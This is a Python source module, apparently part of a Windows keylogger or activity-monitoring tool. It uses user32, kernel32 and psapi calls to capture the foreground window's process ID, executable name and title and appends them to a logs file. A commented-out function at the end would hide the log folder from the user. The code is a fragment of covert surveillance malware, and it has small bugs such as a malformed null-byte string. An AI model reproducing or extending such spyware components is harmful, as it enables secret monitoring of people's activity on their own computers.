#!/usr/bin/python
from modules.Settings import *
from modules.paths import *
from modules.savefile import *

"""This module get the current
    process IDs of the running programs"""


def get_current_process():

    """This function get the process ID of the program
    
    """
    # get the active window handle
    window_handle = user32.GetForegroundWindow()
    
    # get the acitve program process ID
    program_pid = c_ulong(0) 
    user32.GetWindowThreadProcessId(window_handle, byref(program_pid))

    # store the current program process ID
    process_id = "%d" % program_pid.value

    # using the process id , grab the program (exe) path
    program_path = create_string_buffer("\0x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, program_pid)

    psapi.GetModuleBaseNameA(h_process,None, byref(program_path), 512)

    # read the active window title
    window_title = create_string_buffer("\0x00" * 512)
    length = user32.GetWindowTextA(window_handle, byref(window_title),512)

    # get the path of the program
    #TODO

    # save the window name in a file
    save_to_file("\n\n"+"[*] [PID: %s %s %s]" % (process_id, program_path.value, window_title.value), logs_file)
    
    # close the hanldes
    kernel32.CloseHandle(window_handle)
    kernel32.CloseHandle(h_process)
    

##def hide_file(file_path):
##
##   """This function hides the folder of logs"""
##   
##   try:
##        hidden_files = win32file.SetFileAttributes(folder_path, win32file.FILE_ATTRIBUTE_HIDDEN)
##
##   except:
##          print "Error "
